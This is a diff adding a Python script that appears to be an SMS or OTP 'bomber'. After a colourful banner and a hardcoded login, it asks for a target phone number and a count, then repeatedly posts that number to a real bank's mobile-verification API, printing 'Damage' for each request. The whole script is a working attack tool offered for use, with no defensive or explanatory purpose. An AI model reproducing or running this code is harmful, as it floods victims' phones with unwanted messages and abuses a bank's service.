@@ -1,0 +1,91 @@
+import requests,os, sys
+from requests.structures import CaseInsensitiveDict
+
+#CVALUE
+blue= '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan  = "\033[96m"
+end = '\033[0m'
+purple="\033[0;35m"
+os.system('clear')
+line=green+"===================="+red+"===================="+green+"===================="+red+"===================="+green+"===================="+red+"===================="+green+"===================="+red+"===================="+green+"===================="
+space=" "
+def logop(z):
+    for word in z + '\n':
+        sys.stdout.write(word)
+        sys.stdout.flush()
+        
+logo=green+str("""
+          
+                       
+   ╔═════════════════════════════════╗
+   ║ Author   : SHaKiiB               ║
+   ║ Facebook : iTzsHaKiiB            ║
+   ║ GitHub   : iTzSHaKiiB            ║
+   ╚═════════════════════════════════╝
+       
+ 
+  
+  
+""")
+
+logop(logo)
+
+               
+text=red+"\t\tDeveloped By : "+green+"SHaKiiB"+green+"\n\n\t\t★★ "+cyan+" Noob DeveLoper"+green+" ★★   \n" 
+notice=""     
+def header():
+	
+	print(text)
+	print(line)
+	print(notice)
+
+#SECURITY				
+header()
+print(red+"---------------------------------------")
+print(red+"Your need to Login Befor Use The Tools")
+print("---------------------------------------")
+n=2
+while n==2:
+		a=str(input(red+"\n\n\t\t[>] Username:"+green))
+		b=str(input(red+"\n\n\t\t[>] Password:"+green))
+		if a=="iTzSHaKiiB" and b=="iTzSHaKiiB":
+			print(green+"\n\n\t\t[ √ ] Accepted")
+			n=3
+		else:
+			
+			print(red+"\n\n\t\t[ × ] Rejected Try Again")
+			n=2
+			
+			os.system('clear')
+			header()
+
+
+
+number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))
+
+
+amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))
+
+url = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
+
+headers = CaseInsensitiveDict()
+
+headers["Content-Type"]="application/json; charset=UTF-8"
+
+data = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}'
+
+
+for i in range(amount):
+	try:
+		
+		resp = requests.post(url, headers=headers, data=data)
+		
+		print(str (i+1)+" Damage \n")
+
+	except:
+		print ("Please Make Sure Your Internet Connection")
